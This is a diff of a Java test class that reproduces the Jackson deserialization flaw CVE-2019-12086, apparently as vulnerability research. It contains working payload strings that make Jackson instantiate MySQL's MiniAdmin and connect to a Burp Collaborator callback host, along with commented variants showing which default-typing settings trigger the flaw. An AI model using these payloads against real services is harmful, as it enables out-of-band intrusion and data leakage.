@@ -8,7 +8,8 @@ import java.io.IOException;
 
 import org.h2.Driver;
 
-import com.mysql.cj.admin.*;
+//import com.mysql.cj.admin.*;
+import com.mysql.jdbc.MiniAdmin;
 
 public class JacksonSerial {
 	
@@ -57,7 +58,8 @@ public class JacksonSerial {
 	 */
 	public static void cve201912086()
 	{
-		String payload="[\"com.mysql.cj.jdbc.admin.MiniAdmin\",\"jdbc:mysql://jackson.gn78ew4lm9ktv0qgs9wfqs6tzk5bt0.burpcollaborator.net/jackson\"]";
+//		String payload="[\"com.mysql.cj.jdbc.admin.MiniAdmin\",\"jdbc:mysql://jackson.gn78ew4lm9ktv0qgs9wfqs6tzk5bt0.burpcollaborator.net/jackson\"]";
+		String payload="[\"com.mysql.jdbc.MiniAdmin\",\"jdbc:mysql://jackson.mysql.gn78ew4lm9ktv0qgs9wfqs6tzk5bt0.burpcollaborator.net/jackson\"]";
 
         ObjectMapper mapper = new ObjectMapper();
         mapper.enableDefaultTyping();
@@ -67,4 +69,41 @@ public class JacksonSerial {
             e.printStackTrace();
         }
 	}
+	//不同的写法，验证该漏洞，发现通过不同方式开启defaulttyping时，通过object.class进行反序列化时，会触发漏洞
+	/*写法一：
+	  ObjectMapper mapper = new ObjectMapper();
+      mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);
+      Person p2 = (Person)mapper.readValue(param, Object.class);
+	 */
+	/*写法二：
+	 ObjectMapper mapper = new ObjectMapper();
+      mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);
+      Object p2 = mapper.readValue(param, Object.class);
+	 */
+	/*写法三：
+	 ObjectMapper mapper = new ObjectMapper();
+     Object p2 = mapper.readValue(param, Object.class);
+	 */
+	/*写法四：
+	 ObjectMapper mapper = new ObjectMapper();
+    mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);
+    String json = mapper.writeValueAsString(p);
+    Person p2 = (Person)mapper.readValue(json, Person.class);
+	 */
+    /*写法五：
+      ObjectMapper mapper = new ObjectMapper();
+      mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);
+      Person p2 = (Person)mapper.readValue(param, Person.class);
+     */
+	/*写法六：
+	 String payload="[\"com.mysql.jdbc.MiniAdmin\",\"jdbc:mysql://jackson.w96a9ag3g6t6ik7ze4057x08yz4pse.burpcollaborator.net/jackson\"]";
+      ObjectMapper mapper = new ObjectMapper();
+      mapper.enableDefaultTyping();
+      try {
+          mapper.readValue(payload, Object.class);
+      } catch (IOException e) {
+          e.printStackTrace();
+      }
+
+	 */
 }
